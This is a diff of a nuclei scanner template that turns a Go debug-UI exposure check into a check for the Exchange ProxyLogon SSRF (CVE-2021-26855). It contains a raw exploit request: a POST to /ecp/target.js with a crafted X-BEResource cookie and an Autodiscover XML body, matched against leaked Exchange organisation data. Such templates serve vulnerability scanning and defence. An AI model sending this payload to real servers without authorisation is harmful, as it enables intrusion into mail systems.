@@ -1,49 +1,44 @@
-id: check_go_debug_ui
+id: check_CVE-2021-26855
 info:
-  name: check_go_debug_ui
+  name: check_CVE-2021-26855
   author: 51pwn
   severity: critical
+  description: |+
+    https://saucer-man.com/information_security/748.html
   reference:
     - https://github.com/hktalent/nuclei-templates
     - https://51pwn.com
-  tags: web,go,debug
+  tags: web,go,microsoft,exchange,outlook
 
 # nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
 
 requests:
   - raw:
       - |+
-        GET /ui/{{mypaths}} HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
-        Accept:*/*
-        Pragma:no-cache
-        Accept-Encoding:gzip, deflate
+        POST /ecp/target.js HTTP/1.1
+        Host: {{Host}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
         Connection: close
-        Content-Length: 0
+        Cookie: X-BEResource=[name]@{{Host}}/autodiscover/autodiscover.xml?#~1941962754
+        Content-Type: text/xml
+
+        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+        <Request>
+        <EMailAddress>administrator@saucerman.com</EMailAddress>
+        <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+        </Request>
+        </Autodiscover>
         
       # end payload
-    payloads:
-      mypaths:
-        - "top"
-        - "source"
-        - "flamegraph"
-
-    attack: pitchfork 
     unsafe: true
 
     req-condition: true
     stop-at-first-match: true
     matchers-condition: and
     matchers:
-      - type: regex
-        part: body
-        regex:
-          - '<a[^>]+>(pprof|Top|Peek|Source|Disassemble)<\/a>'
       - type: word
         part: body
         words:
-          - 'Output annotated source for functions matching regexp'
-          - 'Output assembly listings annotated with samples'
-          - 'Display profile as a directed graph'
+          - 'Organization/ou=Exchange Administrative Group'
         condition: and
